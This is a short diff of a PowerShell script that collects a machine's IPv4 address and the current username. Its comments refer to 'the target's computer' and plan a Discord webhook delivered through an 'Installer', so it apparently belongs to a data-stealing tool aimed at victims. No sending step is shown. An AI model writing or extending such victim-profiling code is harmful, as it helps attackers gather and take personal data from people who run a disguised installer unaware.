@@ -1,18 +1,8 @@
 # None of the files created will be saved on the target's computer
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
-# Get IPv4 address for WiFi adapter
-$WiFiAdapterName = "Wi-Fi"
-$WiFiIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq $WiFiAdapterName -and $_.AddressFamily -eq "IPv4" }).IPAddress
-
-# Check if Ethernet0 adapter exists
-if ($EthernetIPv4 = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet0" -and $_.AddressFamily -eq "IPv4" }).IPAddress) {
-    # Ethernet0 adapter found
-    $IPAddress = $EthernetIPv4
-} else {
-    # Ethernet0 adapter not found
-    $IPAddress = $WiFiIPv4
-}
+# Get IPv4 address of the machine
+$IPAddress = (ipconfig | Select-String -Pattern "IPv4" | ForEach-Object { $_ -replace '\D+(\d+\.\d+\.\d+\.\d+)', '$1' })
 
 # Get the current user's username
 $Username = $env:USERNAME
